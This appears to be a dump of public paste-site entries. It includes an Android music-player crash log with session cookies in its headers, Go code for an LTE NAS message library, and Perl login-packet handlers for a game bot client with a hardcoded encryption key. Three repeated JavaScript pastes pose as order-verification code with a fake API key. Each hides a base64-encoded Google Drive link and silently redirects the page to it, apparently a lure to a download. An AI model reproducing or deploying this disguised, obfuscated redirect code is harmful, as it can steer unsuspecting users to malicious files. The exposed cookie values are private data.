	at luci.sixsixsix.powerampache2.player.SimpleMediaServiceHandler$onPlayerError$1.invokeSuspend(SimpleMediaServiceHandler.kt:288)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)
Caused by: androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:709)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:268)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 403
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError Invalid response code 403 - User disabled - PlaybackException 
 {""errorCode"":403,""extras"":{""mMap"":{}},""timestampMs"":16566312,""cause"":{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":0},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2004,""extras"":{""mMap"":{}},""timestampMs"":16566007,""cause"":{""headerFields"":{""null"":[""HTTP/1.1 403 User disabled""],""Access-Control-Allow-Headers"":[""Authorization, X-Requested-With""],""Access-Control-Allow-Origin"":[""*""],""Cache-Control"":[""no-store, no-cache, must-revalidate""],""Connection"":[""Keep-Alive""],""Content-Length"":[""0""],""Content-Type"":[""text/html; charset\u003dUTF-8""],""Date"":[""Mon, 21 Apr 2025 20:11:23 GMT""],""Expires"":[""Thu, 19 Nov 1981 08:52:00 GMT""],""Keep-Alive"":[""timeout\u003d5, max\u003d93""],""Permissions-Policy"":[""interest-cohort\u003d()""],""Pragma"":[""no-cache""],""Referrer-Policy"":[""no-referrer""],""Server"":[""Apache""],""Set-Cookie"":[""__Secure-ampache\u003djliu9a6841vfkgi91hrjibd2bf; path\u003d/; domain\u003dplay.dogmazic.net; secure; SameSite\u003dLax"",""__Secure-ampache\u003d60khsjhuur3jhm26ru88cg5mlf; path\u003d/; domain\u003dplay.dogmazic.net; secure; SameSite\u003dLax""],""Strict-Transport-Security"":[""max-age\u003d31536000; includeSubDomains; preload""],""X-Android-Received-Millis"":[""1745266215371""],""X-Android-Response-Source"":[""NETWORK 403""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1745266214813""],""X-Content-Type-Options"":[""nosniff""]},""responseBody"":[],""responseCode"":403,""responseMessage"":""User disabled"",""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2004,""detailMessage"":""Response code: 403"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":268,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""User disabled"",""stackTrace"":[],""suppressedExceptions"":[]}"
TrnKVP4G,2025-04-21T21:09:57.748,powerampache,PHP,Monday 21st of April 2025 03:11:08 PM CDT,"1.01-79-free (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.ScrobbleException: {""errorAction"":""record_play"",""errorCode"":""4704"",""errorMessage"":""Not Found: 121616"",""errorType"":""user""}
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.scrobbleApiCall(SongsRepositoryImpl.kt:652)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.access$scrobbleApiCall(SongsRepositoryImpl.kt:80)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl$scrobbleApiCall$1.invokeSuspend(Unknown Source:15)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:938)
	at android.os.Handler.dispatchMessage(Handler.java:99)
	at android.os.Looper.loop(Looper.java:268)
	at android.app.ActivityThread.main(ActivityThread.java:8016)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:627)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:997)

scrobble() - "
T68n2F57,Order.js,WantingTrae,JavaScript,Monday 21st of April 2025 03:10:04 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91628/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WGLFyDaQ,Market.js,WantingTrae,JavaScript,Monday 21st of April 2025 02:54:42 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/27758/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
T0fnMaEy,Untitled,Borik,Go,Monday 21st of April 2025 02:50:42 PM CDT,"package libnas

import (
	""bytes""
	""testing""
)

func TestNewAttachAccept(t *testing.T) {
	xMsg := TEmmAttachAccept{
		ProtocolDiscriminator: PROTOCOL_DISCRIMINATOR_EPS_MOBILITY_MANAGEMENT_MESSAGES,
		SecurityHeaderType:    NAS_SECURITY_PLAIN_NAS_MESSAGE,
		MessageType:           NAS_EMM_MESSAGE_TYPE_ATTACH_ACCEPT,
		EpsAttachResult:       NAS_EPS_ATTACH_RESULT_COMBINED_EPS_IMSI_ATTACH,
		Spare:                 0,
		Timer3412value:        0x49,
		//TaiList:               []byte{0x2, 0x52, 0xf0, 0x99, 0x8e, 0x58, 0x8d, 0xf4, 0x8d, 0x2c},
		TaiList: TIeTaiList{
			taiList: []tTai{
				{
					plmn: []byte{0x52, 0xf0, 0x99},
					tac:  0x8e58,
				},
				{
					plmn: []byte{0x52, 0xf0, 0x99},
					tac:  0x8df4,
				},
				{
					plmn: []byte{0x52, 0xf0, 0x99},
					tac:  0x8d2c,
				},
			},
		},
		EsmMessageContainer: []byte{0x52, 0x1, 0xc1, 0x1, 0x9, 0x27, 0x8, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e,
			0x65, 0x74, 0x7, 0x62, 0x65, 0x65, 0x6c, 0x69, 0x6e, 0x65, 0x2, 0x72, 0x75, 0x6, 0x6d, 0x6e, 0x63, 0x30,
			0x39, 0x39, 0x6, 0x6d, 0x63, 0x63, 0x32, 0x35, 0x30, 0x4, 0x67, 0x70, 0x72, 0x73, 0x5, 0x1, 0xa, 0x46, 0xda,
			0x23, 0x5d, 0x1, 0x0, 0x30, 0x10, 0x23, 0x92, 0x1f, 0x91, 0x97, 0xfe, 0xfe, 0x46, 0x48, 0x0, 0x0, 0x0, 0xfa,
			0x0, 0xde, 0x0, 0x32, 0x3, 0x82, 0x5e, 0x6, 0xfe, 0xfe, 0x96, 0xde, 0x2, 0x0, 0x58, 0x32, 0x27, 0x28, 0x80,
			0x80, 0x21, 0xa, 0x3, 0x0, 0x0, 0xa, 0x81, 0x6, 0x55, 0xf9, 0x16, 0xf8, 0x0, 0xd, 0x4, 0x55, 0xf9, 0x16,
			0xf8, 0x0, 0x3, 0x10, 0x20, 0x1, 0x48, 0x60, 0x48, 0x60, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x88},
		Guti:                       &[]byte{0xf6, 0x52, 0xf0, 0x99, 0x80, 0x3, 0xc8, 0xc2, 0x1, 0xca, 0x19},
		LocationAreaIdentification: &[]byte{0x52, 0xf0, 0x99, 0xa5, 0x0},
		MsIdentity:                 &[]byte{0xf4, 0x6d, 0x50, 0xc0, 0x15},
		EmmCause:                   nil,
		Timer3402:                  &[]byte{0x2c},
		Timer3423:                  &[]byte{0x2c},
		EquivalentPLMNs:            nil,
		EmergencyNumberList:        nil,
		EpsNetworkFeature:          &[]byte{0x01},
		AdditionalUpdateResults:    &[]byte{0},
	}
	a, err := MarshalNasPdu(&xMsg)
	if err != nil {
		t.Error(err)
	}
	nas, err := NewNAS(a, nil, nil, DIRECTION_DOWNLINK)
	if err != nil {
		t.Error(err)
	}
	var mt TNAS_MESSAGE_TYPE
	if mt, err = nas.Type(); err != nil {
		t.Error(err)
	}
	if mt != NAS_EMM_MESSAGE_TYPE_ATTACH_ACCEPT {
		t.Errorf(""Wrong MessageType, expected %d but %d found"", NAS_EMM_MESSAGE_TYPE_ATTACH_ACCEPT, mt)
	}
	var msg *TEmmAttachAccept
	var ok bool
	if msg, ok = nas.NasMsg.(*TEmmAttachAccept); !ok {
		t.Error(""NasMsg is not a TEmmAttachAccept but a must"")
	}
	if msg == nil {
		t.Fatalf(""msg is nil"")
	}
	if bytes.Compare(msg.EsmMessageContainer, xMsg.EsmMessageContainer) != 0 {
		t.Error(""Wrong EsmMessageContainer"")
	}
	if msg.ProtocolDiscriminator != xMsg.ProtocolDiscriminator {
		t.Error(""Wrong ProtocolDiscriminator"")
	}
	if msg.SecurityHeaderType != xMsg.SecurityHeaderType {
		t.Error(""Wrong SecurityHeaderType"")
	}
	if msg.MessageType != xMsg.MessageType {
		t.Error(""Wrong MessageType"")
	}
	if msg.EpsAttachResult != xMsg.EpsAttachResult {
		t.Error(""Wrong EpsAttachResult"")
	}
	if msg.Timer3412value != xMsg.Timer3412value {
		t.Error(""Wrong Timer3412value"")
	}
	if bytes.Compare(*msg.Guti, *xMsg.Guti) != 0 {
		t.Error(""Wrong Guti"")
	}
	if bytes.Compare(*msg.LocationAreaIdentification, *xMsg.LocationAreaIdentification) != 0 {
		t.Error(""Wrong LocationAreaIdentification"")
	}
	if bytes.Compare(*msg.MsIdentity, *xMsg.MsIdentity) != 0 {
		t.Error(""Wrong MsIdentity"")
	}
	if msg.EmmCause != xMsg.EmmCause {
		t.Error(""Wrong EmmCause"")
	}
	if bytes.Compare(*msg.Timer3402, *xMsg.Timer3402) != 0 {
		t.Error(""Wrong Timer3402"")
	}
	if bytes.Compare(*msg.Timer3423, *xMsg.Timer3423) != 0 {
		t.Error(""Wrong Timer3423"")
	}
	if bytes.Compare(*msg.EpsNetworkFeature, *xMsg.EpsNetworkFeature) != 0 {
		t.Error(""Wrong EpsNetworkFeature"")
	}
	if bytes.Compare(*msg.AdditionalUpdateResults, *xMsg.AdditionalUpdateResults) != 0 {
		t.Error(""Wrong AdditionalUpdateResults"")
	}
	if len(msg.TaiList.taiList) != len(xMsg.TaiList.taiList) {
		t.Error(""Length of taiList should be the same!"")
	}
}
"
e8e1Ytwu,Network::Receive::ROla,ovokore,Perl,Monday 21st of April 2025 02:41:57 PM CDT,"package Network::Receive::ROla;

use strict;
use base qw(Network::Receive::ServerType0);

sub new {
	my ($class) = @_;
	my $self = $class->SUPER::new(@_);
	
	my %packets = (
		'0AE3' => ['received_login_token', 'v l Z20 Z*', [qw(len login_type flag login_token)]],
		'0AC4' => ['account_server_info', 'v a4 a4 a4 a4 a26 C x17 a*', [qw(len sessionID accountID sessionID2 lastLoginIP lastLoginTime accountSex serverInfo)]],
	);
	
	$self->{packet_list}{$_} = $packets{$_} for keys %packets;

    my %handlers = qw(
		received_login_token 0AE3
		account_server_info 0AC4
	);

	$self->{packet_lut}{$_} = $handlers{$_} for keys %handlers;
	
	return $self;
}

1;"
wqm9zySs,Network::Send::ROla,ovokore,Perl,Monday 21st of April 2025 02:41:00 PM CDT,"package Network::Send::ROla;
use strict;
use base qw(Network::Send::ServerType0);
# use Globals qw($net);
use Globals;

use Log qw(debug);

sub new {
	my ($class) = @_;
	my $self = $class->SUPER::new(@_);
	
	my %packets = (
        '0C26' => ['master_login', 'a4 Z50 x a32 a5', [qw(game_code username password_rijndael flag)]],
		'0825' => ['token_login', 'v V C Z51 a17 a15 a*', [qw(len master_version version username mac_hyphen_separated ip login_token)]],
	);

	$self->{packet_list}{$_} = $packets{$_} for keys %packets;

	my %handlers = qw(
		master_login 0C26
		token_login 0825
	);

	$self->{packet_lut}{$_} = $handlers{$_} for keys %handlers;
	
	return $self;
}

sub reconstruct_master_login {
	my ($self, $args) = @_;

	my $master = $masterServers{$config{master}};
	$net->serverDisconnect();
	$net->serverConnect($master->{OTP_ip}, $master->{OTP_port});

	if (exists $args->{password}) {
		for (Digest::MD5->new) {
			$_->add($args->{password});
			$args->{password_md5} = $_->clone->digest;
			$args->{password_md5_hex} = $_->hexdigest;
		}

		my $key = pack('C32', (0x06, 0xA9, 0x21, 0x40, 0x36, 0xB8, 0xA1, 0x5B, 0x51, 0x2E, 0x03, 0xD5, 0x34, 0x12, 0x00, 0x06, 0x06, 0xA9, 0x21, 0x40, 0x36, 0xB8, 0xA1, 0x5B, 0x51, 0x2E, 0x03, 0xD5, 0x34, 0x12, 0x00, 0x06));
		my $chain = pack('C32', (0x3D, 0xAF, 0xBA, 0x42, 0x9D, 0x9E, 0xB4, 0x30, 0xB4, 0x22, 0xDA, 0x80, 0x2C, 0x9F, 0xAC, 0x41, 0x3D, 0xAF, 0xBA, 0x42, 0x9D, 0x9E, 0xB4, 0x30, 0xB4, 0x22, 0xDA, 0x80, 0x2C, 0x9F, 0xAC, 0x41));
		my $in = pack('a32', $args->{password});
		my $rijndael = Utils::Rijndael->new;
		$rijndael->MakeKey($key, $chain, 32, 32);
		$args->{password_rijndael} = $rijndael->Encrypt($in, undef, 32, 0);
	}
}

sub sendTokenToServer {
	my ($self, $username, $password, $master_version, $version, $token, $length, $otp_ip, $otp_port) = @_;
	my $len =  $length + 92;

	my $master = $masterServers{$config{master}};
	$net->serverDisconnect();
	$net->serverConnect($master->{ip}, $master->{port});

	my $ip = '192.168.0.2';
	my $mac = $config{macAddress} || '111111111111'; # gibberish
	my $mac_hyphen_separated = join '-', $mac =~ /(..)/g;

	my $msg = $self->reconstruct({
		switch => 'token_login',
		len => $len,
		version => $version || $self->version,
		master_version => $master_version,
		username => $username,
		mac_hyphen_separated => $mac_hyphen_separated,
		ip => pad_ip($ip),
		login_token => $token,
	});

	$self->sendToServer($msg);

	debug ""Sent sendTokenLogin\n"", ""sendPacket"", 2;
}

sub pad_ip {
    my $ip = shift;
    my $len = length($ip);
    return $ip . (""\x00"" x (14 - $len)) . ""\x17"" if $len < 15;
    return $ip;
}

1;"
E3eG3q8S,Untitled,WantingTrae,JavaScript,Monday 21st of April 2025 02:39:20 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/96260/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5LBXZcB2,Untitled,Borik,Go,Monday 21st of April 2025 02:29:21 PM CDT,"package libnas

import (
	""log""
	""reflect""
)

type TEpsQoS struct {
	QCI                        byte
	MBRUp, MBRDn, GBRUp, GBRDn uint64
}

func (qos *TEpsQoS) Value() (res []byte) {
	res = append(res, qos.QCI)
	if qos.MBRUp == 0 && qos.MBRDn == 0 && qos.GBRUp == 0 && qos.GBRDn == 0 {
		return
	}
	// todo implement of MBR&GBR coding here
	return
}

func (qos *TEpsQoS) Set(a any) {
	if z, ok := a.([]byte); !ok {
		log.Printf(""TEpsQos accepting only slices as input for unmarshal but %s found"", reflect.TypeOf(a).String())
	} else {
		qos.QCI = z[0]
		// todo implement decoding MBR&GBR here
	}
	return
}
"
qFBr6SAn,Untitled,Borik,Go,Monday 21st of April 2025 02:28:00 PM CDT,"package libnas

import ""reflect""

type TEsmActivateDefaultEpsBearerContextRequest struct {
	ProtocolDiscriminator        TPROTOCOL_DISCRIMINATOR       `nas_ie_type:""V"" nas_ie_length:""1/2"" nas_ie_position:""LSB""`
	EpsBearerIdentity            TEpsBearerIdentity            `nas_ie_type:""V"" nas_ie_length:""1/2"" nas_ie_position:""MSB""`
	ProcedureTransactionIdentity TProcedureTransactionIdentity `nas_ie_type:""V"" nas_ie_length:""1""`
	MessageType                  TNAS_ESM_MESSAGE_TYPE         `nas_ie_type:""V"" nas_ie_length:""1""`
	EpsQoS                       TEpsQoS                       `nas_ie_type:""LV""`
	AccessPointName              []byte                        `nas_ie_type:""LV""`
	PDNAddress                   TPDNAddress                   `nas_ie_type:""LV""`
	TransactionIdentifier        *[]byte                       `nas_ie_type:""TLV"" nas_iei:""0x5d""`
	NegotiatedQoS                *[]byte                       `nas_ie_type:""TLV"" nas_iei:""0x30""`
	NegotiatedLlcSapi            *[]byte                       `nas_ie_type:""TV"" nas_ie_length:""2"" nas_iei:""0x32""`
	RadioPriority                *[]byte                       `nas_ie_type:""TV"" nas_ie_length:""2"" nas_iei:""0x8""`
	PacketFlowIdentifier         *[]byte                       `nas_ie_type:""TLV"" nas_iei:""0x34""`
	ApnAmbr                      *TApnAmbr                     `nas_ie_type:""TLV"" nas_iei:""0x5e""`
	EsmCause                     *[]byte                       `nas_ie_type:""TV"" nas_ie_length:""2"" nas_iei:""0x58""`
	ProtocolConfigurationOptions *[]byte                       `nas_ie_type:""TLV"" nas_iei:""0x27""`
}

func NewTEsmActivateDefaultEpsBearerContextRequest(
	epsBearerIdentity TEpsBearerIdentity,
	procedureTransactionIdentity TProcedureTransactionIdentity,
	epsQoS TEpsQoS,
	accessPointName []byte,
	PDNAddress TPDNAddress,
) *TEsmActivateDefaultEpsBearerContextRequest {
	return &TEsmActivateDefaultEpsBearerContextRequest{
		ProtocolDiscriminator:        PROTOCOL_DISCRIMINATOR_EPS_SESSION_MANAGEMENT_MESSAGES,
		EpsBearerIdentity:            epsBearerIdentity,
		ProcedureTransactionIdentity: procedureTransactionIdentity,
		MessageType:                  NAS_ESM_MESSAGE_TYPE_ACTIVATE_DEFAULT_EPS_BEARER_CONTEXT_REQUEST,
		EpsQoS:                       epsQoS,
		AccessPointName:              accessPointName,
		PDNAddress:                   PDNAddress,
	}
}

func (msg *TEsmActivateDefaultEpsBearerContextRequest) Unmarshal(pdu []byte) (res TNasMsg, err error) {
	return unmarshalNasPdu(pdu, reflect.TypeOf(*msg))
}
"
VZV32yh9,Untitled,Borik,Go,Monday 21st of April 2025 02:26:43 PM CDT,"package libnas

import (
	""encoding/binary""
	""errors""
	""fmt""
	""log""
	""reflect""
	""strconv""
)

// TNasMsg
// all implementations should be a pointer to type
type TNasMsg interface {
	Unmarshal(pdu []byte) (res TNasMsg, err error)
}

type TNasMsgIE interface {
	Value() []byte
	Set(any)
}

func (pdu *TNAS) UnmarshalNasPdu() (res TNasMsg, err error) {
	t, err := pdu.Type()
	if err != nil {
		return
	}
	switch pdu.PD() {
	case PROTOCOL_DISCRIMINATOR_EPS_MOBILITY_MANAGEMENT_MESSAGES:
		switch t {
		case NAS_EMM_MESSAGE_TYPE_ATTACH_ACCEPT:
			return (&TEmmAttachAccept{}).Unmarshal(pdu.decodedMsg.msg)
		case NAS_EMM_MESSAGE_TYPE_ATTACH_REQUEST:
			return (&TEmmAttachRequest{}).Unmarshal(pdu.decodedMsg.msg)
		case NAS_EMM_MESSAGE_TYPE_SECURITY_MODE_COMMAND:
			return (&TEmmSecurityModeCommand{}).Unmarshal(pdu.decodedMsg.msg)
		case NAS_EMM_MESSAGE_TYPE_SECURITY_MODE_COMPLETE:
			return (&tEmmSecurityModeComplete{}).Unmarshal(pdu.decodedMsg.msg)
		case NAS_EMM_MESSAGE_TYPE_AUTHENTICATION_RESPONSE:
			return (&TEmmAuthenticationResponse{}).Unmarshal(pdu.decodedMsg.msg)
		default:
			return nil, errors.New(""not supported"")
		}
	case PROTOCOL_DISCRIMINATOR_EPS_SESSION_MANAGEMENT_MESSAGES:
		switch t {
		case NAS_ESM_MESSAGE_TYPE_ESM_INFORMATION_RESPONSE:
			return (&TEsmInformationResponse{}).Unmarshal(pdu.decodedMsg.msg)
		case NAS_ESM_MESSAGE_TYPE_ESM_INFORMATION_REQUEST:
			return (&TEsmInformationRequest{}).Unmarshal(pdu.decodedMsg.msg)
		case NAS_ESM_MESSAGE_TYPE_PDN_CONNECTIVITY_REQUEST:
			return (&TEsmPdnConnectivityRequest{}).Unmarshal(pdu.decodedMsg.msg)
		case NAS_ESM_MESSAGE_TYPE_ACTIVATE_DEFAULT_EPS_BEARER_CONTEXT_REQUEST:
			return (&TEsmActivateDefaultEpsBearerContextRequest{}).Unmarshal(pdu.decodedMsg.msg)
		default:
			return nil, errors.New(""not supported"")
		}
	default:
		return nil, errors.New(""not supported"")
	}
}

func MarshalNasPdu(msg TNasMsg) (res []byte, err error) {
	sMsg := reflect.ValueOf(msg)
	tMsg := sMsg.Type()
	if tMsg.Kind() == reflect.Pointer {
		tMsg = tMsg.Elem()
		sMsg = reflect.ValueOf(msg).Elem()
	}
	for i := 0; i < sMsg.NumField(); i++ {
		ieV := sMsg.Field(i)
		var complVal bool
		if ieV.Type().Implements(reflect.TypeOf((*TNasMsgIE)(nil)).Elem()) {
			ieV = ieV.MethodByName(""Value"").Call([]reflect.Value{})[0]
			complVal = true
		} else if ieV.CanAddr() && ieV.Addr().Type().Implements(reflect.TypeOf((*TNasMsgIE)(nil)).Elem()) {
			ieV = ieV.Addr().MethodByName(""Value"").Call([]reflect.Value{})[0]
			complVal = true
		}
		var vRes []byte
		ieT := tMsg.Field(i).Tag.Get(""nas_ie_type"")
		switch ieT {
		case ""V"":
			ieL := tMsg.Field(i).Tag.Get(""nas_ie_length"")
			if ieL == ""1/2"" {
				ieP := tMsg.Field(i).Tag.Get(""nas_ie_position"")
				if ieP == ""LSB"" {
					vRes = []byte{byte(ieV.Uint())}
				} else if ieP == ""MSB"" {
					// todo implement here complex types
					res[len(res)-1] = (res[len(res)-1] & 0x0f) | byte(ieV.Uint()<<4)
					continue
				}
			} else {
				var l int
				l, err = strconv.Atoi(ieL)
				if err != nil {
					return nil, err
				}
				vRes = make([]byte, l)
				if l == 1 {
					vRes[0] = byte(ieV.Uint())
				} else {
					copy(vRes, ieV.Bytes()[:l])
				}
			}
		case ""LV"":
			l := byte(len(ieV.Bytes()))
			vRes = append(vRes, l)
			vRes = append(vRes, ieV.Bytes()...)
		case ""LVE"":
			l := uint16(len(ieV.Bytes()))
			la := make([]byte, 2)
			_, _ = binary.Encode(la, binary.BigEndian, l)
			vRes = append(vRes, la...)
			vRes = append(vRes, ieV.Bytes()...)
		case ""T"":
			if ieV.IsNil() {
				continue
			}
			var iei int64
			iei, err = strconv.ParseInt(tMsg.Field(i).Tag.Get(""nas_iei""), 0, 8)
			if err != nil {
				return nil, err
			}
			vRes = append(vRes, byte(iei))
		case ""TV"":
			if ieV.IsNil() {
				continue
			}
			ieL := tMsg.Field(i).Tag.Get(""nas_ie_length"")
			var l int
			l, err = strconv.Atoi(ieL)
			if err != nil {
				return nil, err
			}
			var iei int64
			iei, err = strconv.ParseInt(tMsg.Field(i).Tag.Get(""nas_iei""), 0, 8)
			if err != nil {
				return nil, err
			}
			var _ieV reflect.Value
			if complVal {
				_ieV = ieV
			} else {
				_ieV = ieV.Elem()
			}
			if l == 1 {
				vRes = append(vRes, _ieV.Bytes()[0]|byte(iei)<<4)
			} else {
				l-- // skip ie identifier - it is one byte always
				vRes = append(vRes, byte(iei))
				vRes = append(vRes, _ieV.Bytes()[:l]...)
			}
		case ""TLV"":
			if ieV.IsNil() {
				continue
			}
			var iei int64
			iei, err = strconv.ParseInt(tMsg.Field(i).Tag.Get(""nas_iei""), 0, 8)
			if err != nil {
				return nil, err
			}
			var _ieV reflect.Value
			if complVal {
				_ieV = ieV
			} else {
				_ieV = ieV.Elem()
			}
			l := byte(len(_ieV.Bytes()))
			vRes = append(vRes, byte(iei))
			vRes = append(vRes, l)
			vRes = append(vRes, _ieV.Bytes()[:l]...)
		case ""TLVE"":
			if ieV.IsNil() {
				continue
			}
			var iei int64
			iei, err = strconv.ParseInt(tMsg.Field(i).Tag.Get(""nas_iei""), 0, 8)
			if err != nil {
				return nil, err
			}
			var _ieV reflect.Value
			if complVal {
				_ieV = ieV
			} else {
				_ieV = ieV.Elem()
			}
			l := uint16(len(_ieV.Bytes()))
			la := make([]byte, 2)
			_, _ = binary.Encode(la, binary.BigEndian, l)
